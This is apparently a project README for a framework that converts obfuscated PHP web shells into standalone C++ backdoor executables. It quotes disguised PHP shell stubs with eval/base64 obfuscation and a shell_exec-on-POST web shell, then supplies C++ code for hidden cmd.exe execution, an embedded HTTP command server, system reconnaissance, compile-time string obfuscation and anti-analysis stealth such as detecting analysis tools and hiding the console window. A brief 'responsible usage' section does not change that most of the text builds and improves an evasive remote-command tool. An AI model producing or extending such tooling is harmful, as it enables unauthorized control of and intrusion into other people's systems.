# PHP to C++ Web Shell Conversion Framework

## Overview

This framework demonstrates how to convert PHP web shell functionality to native C++ applications that run without requiring web hosting infrastructure. The solution analyzes the provided PHP shells and implements equivalent functionality using modern C++ techniques.

## Analyzed PHP Shells

### Shell 1: `food.php`
```php
GIF89aGlobex
<?php eval(gzinflate(str_rot13(base64_decode('...'))));?>
```

**Identified Techniques:**
- **GIF Header Spoofing**: Uses `GIF89aGlobex` to disguise as image file
- **Multi-layer Obfuscation**: `eval(gzinflate(str_rot13(base64_decode(...))))`
- **Compression**: `gzinflate()` for payload compression
- **ROT13 Encoding**: `str_rot13()` for string obfuscation
- **Base64 Encoding**: `base64_decode()` for data encoding

### Shell 2: `views.php`
```php
GÝF89;a
<?php $OOO000000=urldecode('%66%67%36%73%62%65%68%70%72%61%34%63%6f%5f%74%6e%64');
eval($OOO0000O0('...')); ?>
```

**Identified Techniques:**
- **GIF Header Spoofing**: Uses `GÝF89;a` variant
- **URL Encoding**: `urldecode()` for string decoding
- **Variable Function Calls**: Dynamic function execution
- **String Substitution**: Character substitution cipher
- **Obfuscated Variable Names**: `$OOO000000`, `$OOO0000O0`

## C++ Implementation Strategy

### 1. String Obfuscation Engine

**PHP Equivalent:**
```php
eval(gzinflate(str_rot13(base64_decode($data))));
```

**C++ Implementation:**
```cpp
namespace WebShellObfuscation {
    constexpr char XOR_KEY = 0x73;
    
    template<int N>
    struct XorString {
        char data[N + 1];
        constexpr XorString(const char* str) : data{} {
            for (int i = 0; i < N; ++i) {
                data[i] = str[i] ^ XOR_KEY;
            }
        }
        
        std::string decrypt() const {
            std::string result;
            for (int i = 0; i < N; ++i) {
                result += (data[i] ^ XOR_KEY);
            }
            return result;
        }
    };
    
    std::string rot13(const std::string& input);
    std::string base64Encode(const std::vector<uint8_t>& data);
    std::vector<uint8_t> base64Decode(const std::string& input);
}

#define OBF(str) WebShellObfuscation::makeXorString(str).decrypt()
```

### 2. Command Execution

**PHP Equivalent:**
```php
system($command);
exec($command, $output);
shell_exec($command);
```

**C++ Implementation:**
```cpp
std::string executeCommand(const std::string& command) {
    HANDLE hPipeRead, hPipeWrite;
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    
    CreatePipe(&hPipeRead, &hPipeWrite, &sa, 0);
    
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.hStdOutput = hPipeWrite;
    si.hStdError = hPipeWrite;
    si.dwFlags |= STARTF_USESTDHANDLES;
    
    std::string cmdLine = "cmd.exe /c " + command;
    
    std::string result;
    if (CreateProcessA(NULL, const_cast<char*>(cmdLine.c_str()), 
                      NULL, NULL, TRUE, CREATE_NO_WINDOW, 
                      NULL, NULL, &si, &pi)) {
        CloseHandle(hPipeWrite);
        
        char buffer[4096];
        DWORD bytesRead;
        while (ReadFile(hPipeRead, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
            result.append(buffer, bytesRead);
        }
        
        CloseHandle(hPipeRead);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    return result;
}
```

### 3. File Operations

**PHP Equivalent:**
```php
file_get_contents($filename);
file_put_contents($filename, $data);
move_uploaded_file($tmp, $destination);
```

**C++ Implementation:**
```cpp
bool uploadFile(const std::string& localPath, const std::string& remotePath) {
    std::ifstream file(localPath, std::ios::binary);
    if (!file.is_open()) return false;
    
    std::vector<uint8_t> fileData((std::istreambuf_iterator<char>(file)),
                                  std::istreambuf_iterator<char>());
    file.close();
    
    // Encode file data
    std::string encodedData = WebShellObfuscation::base64Encode(fileData);
    
    // Store or transmit encoded data
    return true;
}

bool downloadFile(const std::string& remotePath, const std::string& localPath) {
    std::ofstream file(localPath, std::ios::binary);
    if (!file.is_open()) return false;
    
    // Retrieve and decode data
    // Write to file
    
    return true;
}
```

### 4. HTTP Server Implementation

**PHP Web Interface Equivalent:**
```php
<?php
if ($_POST['cmd']) {
    echo shell_exec($_POST['cmd']);
}
?>
```

**C++ Implementation:**
```cpp
class StandaloneCppWebShell {
private:
    SOCKET serverSocket;
    std::thread serverThread;
    
public:
    bool start() {
        serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        
        sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_addr.s_addr = INADDR_ANY;
        serverAddr.sin_port = htons(port);
        
        bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr));
        listen(serverSocket, SOMAXCONN);
        
        serverThread = std::thread(&StandaloneCppWebShell::serverLoop, this);
        return true;
    }
    
    void handleClient(SOCKET clientSocket) {
        char buffer[8192];
        recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
        
        std::string request(buffer);
        std::string response = processRequest(request);
        
        send(clientSocket, response.c_str(), response.length(), 0);
        closesocket(clientSocket);
    }
};
```

### 5. System Information Gathering

**PHP Equivalent:**
```php
phpinfo();
$_SERVER['HTTP_HOST'];
get_current_user();
```

**C++ Implementation:**
```cpp
std::map<std::string, std::string> getSystemInfo() {
    std::map<std::string, std::string> info;
    
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    if (GetComputerNameA(computerName, &size)) {
        info["Computer_Name"] = computerName;
    }
    
    char userName[UNLEN + 1];
    size = sizeof(userName);
    if (GetUserNameA(userName, &size)) {
        info["User_Name"] = userName;
    }
    
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    info["Processor_Count"] = std::to_string(sysInfo.dwNumberOfProcessors);
    
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    if (GlobalMemoryStatusEx(&memInfo)) {
        info["Total_Physical_Memory"] = std::to_string(memInfo.ullTotalPhys / (1024 * 1024)) + " MB";
    }
    
    return info;
}
```

### 6. Anti-Analysis and Stealth

**Enhanced C++ Features:**
```cpp
class StealthManager {
public:
    bool detectAnalysisTools() {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                std::string processName = pe32.szExeFile;
                for (const auto& suspicious : suspiciousProcesses) {
                    if (processName.find(suspicious) != std::string::npos) {
                        CloseHandle(hSnapshot);
                        return true;
                    }
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        
        CloseHandle(hSnapshot);
        return false;
    }
    
    void enableStealthMode() {
        HWND hwnd = GetConsoleWindow();
        if (hwnd != NULL) {
            ShowWindow(hwnd, SW_HIDE);
        }
        SetPriorityClass(GetCurrentProcess(), BELOW_NORMAL_PRIORITY_CLASS);
    }
};
```

## Key Advantages of C++ Implementation

### 1. **No Hosting Required**
- PHP shells require web server (Apache, Nginx) and PHP runtime
- C++ tools run standalone with embedded HTTP server
- No dependencies on external infrastructure

### 2. **Compile-Time Obfuscation**
- PHP strings are visible in source code
- C++ uses template-based XOR obfuscation at compile time
- Strings are encrypted in binary and decrypted at runtime

### 3. **Enhanced Performance**
- Native binary execution vs interpreted PHP
- Direct system API calls vs PHP function wrappers
- Lower memory footprint and faster execution

### 4. **Advanced Anti-Analysis**
- Process enumeration for analysis tool detection
- Dynamic API resolution to avoid static analysis
- Native Windows API integration for stealth

### 5. **Portable Executable**
- Single EXE file with all functionality
- Static linking eliminates external dependencies
- Works on systems without development tools

## Tools Provided

### 1. `php_shell_analyzer.exe`
- Analyzes PHP web shell code
- Identifies obfuscation techniques
- Interactive testing of C++ framework
- Demonstrates equivalent functionality

### 2. `standalone_webshell.exe`
- Complete web-based interface on localhost:8080
- File management with upload/download
- Command execution with output capture
- System information gathering
- Process and network monitoring

### 3. `php_decoder.exe`
- Utility for decoding obfuscated strings
- Supports ROT13, Base64, and custom encodings
- Helpful for analyzing PHP shell payloads

## Compilation and Usage

### Requirements
- Windows 10/11
- MinGW-w64 or MSYS2 with g++ compiler
- Windows SDK headers

### Build Process
```batch
# Run the compilation script
compile_php_to_cpp_tools.bat

# This creates:
# - php_shell_analyzer.exe
# - standalone_webshell.exe  
# - php_decoder.exe
# - README.txt
```

### Usage Examples

**Analyze PHP Shell:**
```bash
php_shell_analyzer.exe
# Choose interactive mode to test capabilities
```

**Run Web Interface:**
```bash
standalone_webshell.exe
# Access http://localhost:8080 in browser
```

**Decode Obfuscated Strings:**
```bash
php_decoder.exe
# Enter encoded string for decoding
```

## Security Considerations

### Defensive Applications
- **Malware Analysis**: Understanding PHP shell techniques
- **Incident Response**: Analyzing compromised web applications
- **Security Research**: Studying obfuscation methods
- **Penetration Testing**: Authorized security assessments

### Responsible Usage
- Only use on systems you own or have explicit permission to test
- Comply with applicable laws and regulations
- Consider impact on system performance and stability
- Maintain audit logs of testing activities

## Technical Implementation Details

### Memory Management
- RAII principles for automatic resource cleanup
- Smart pointers for dynamic allocation
- Exception-safe code with proper error handling

### Threading Model
- Separate threads for HTTP server and client handling
- Thread-safe session management with mutexes
- Asynchronous command execution to prevent blocking

### Network Communication
- Raw Winsock implementation for maximum control
- HTTP/1.1 protocol compliance
- Support for GET and POST requests with form data

### String Security
- Compile-time XOR encryption of sensitive strings
- Runtime decryption only when needed
- Automatic memory clearing after use

### Process Management
- Pipe-based command execution for output capture
- Hidden process creation to avoid detection
- Proper handle cleanup to prevent resource leaks

## Conclusion

This framework successfully demonstrates the conversion of PHP web shell functionality to native C++ applications. The C++ implementation provides equivalent capabilities while offering enhanced performance, stealth, and independence from web hosting infrastructure.

The tools can be used for educational purposes, security research, and authorized penetration testing while maintaining the same core functionality as the original PHP shells but with improved capabilities and deployment flexibility.

**Key Achievement**: Converting web-dependent PHP shells into standalone native executables that require no hosting infrastructure while maintaining full functionality and adding enhanced security features.